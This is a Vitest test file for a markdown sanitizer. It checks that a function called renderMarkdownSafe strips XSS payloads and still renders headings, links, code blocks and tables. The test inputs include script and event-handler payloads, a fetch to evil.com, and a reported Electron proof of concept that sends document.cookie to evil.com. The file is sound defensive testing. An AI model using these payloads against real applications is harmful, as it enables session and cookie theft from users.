import { describe, it, expect } from 'vitest';
import { renderMarkdownSafe } from './safe-markdown';

describe('renderMarkdownSafe', () => {
  it('strips script tags', () => {
    const result = renderMarkdownSafe('<script>alert(1)</script>');
    expect(result).not.toContain('<script');
    expect(result).not.toContain('alert(1)');
  });

  it('strips event handlers from img tags', () => {
    const result = renderMarkdownSafe('<img src=x onerror=alert(1)>');
    expect(result).not.toContain('onerror');
    expect(result).toContain('<img');
    expect(result).toContain('src="x"');
  });

  it('strips SVG onload handlers', () => {
    const result = renderMarkdownSafe('<svg onload=alert(1)>');
    expect(result).not.toContain('onload');
    // svg is not in allowed tags, so it should be stripped entirely
    expect(result).not.toContain('<svg');
  });

  it('strips nested injection payloads', () => {
    const result = renderMarkdownSafe(
      '<div><img src=x onerror="fetch(\'http://evil.com\')"></div>',
    );
    expect(result).not.toContain('onerror');
    expect(result).not.toContain('fetch');
  });

  it('preserves valid markdown rendering', () => {
    const result = renderMarkdownSafe(
      '# Hello\n\n**bold** and [link](https://example.com)',
    );
    expect(result).toContain('<h1');
    expect(result).toContain('Hello');
    expect(result).toContain('<strong>bold</strong>');
    expect(result).toContain('<a href="https://example.com"');
    expect(result).toContain('link</a>');
  });

  it('preserves code blocks with HTML-like content', () => {
    const result = renderMarkdownSafe(
      '```html\n<script>alert(1)</script>\n```',
    );
    expect(result).toContain('<code');
    expect(result).toContain('<pre');
    // The script should be escaped inside code blocks, not executable
    expect(result).not.toMatch(/<script[^<]*>/);
  });

  it('strips data URIs with script payloads', () => {
    const result = renderMarkdownSafe(
      '<img src="data:text/html,<script>alert(1)</script>">',
    );
    // DOMPurify should strip the dangerous data URI or the whole tag
    expect(result).not.toContain('data:text/html');
  });

  it('strips iframe tags', () => {
    const result = renderMarkdownSafe(
      '<iframe src="https://evil.com"></iframe>',
    );
    expect(result).not.toContain('<iframe');
  });

  it('strips javascript: protocol in links', () => {
    const result = renderMarkdownSafe(
      '<a href="javascript:alert(1)">click me</a>',
    );
    expect(result).not.toContain('javascript:');
  });

  it('preserves tables', () => {
    const md = '| A | B |\n|---|---|\n| 1 | 2 |';
    const result = renderMarkdownSafe(md);
    expect(result).toContain('<table');
    expect(result).toContain('<th');
    expect(result).toContain('<td');
  });

  it('strips style attributes', () => {
    const result = renderMarkdownSafe(
      '<div style="background:url(javascript:alert(1))">text</div>',
    );
    expect(result).not.toContain('style');
  });

  it('handles the PoC from the security report', () => {
    const result = renderMarkdownSafe(
      '<img src=x onerror="require(\'electron\').shell.openExternal(\'https://evil.com/\'+document.cookie)">',
    );
    expect(result).not.toContain('onerror');
    expect(result).not.toContain('require');
    expect(result).not.toContain('document.cookie');
  });
});
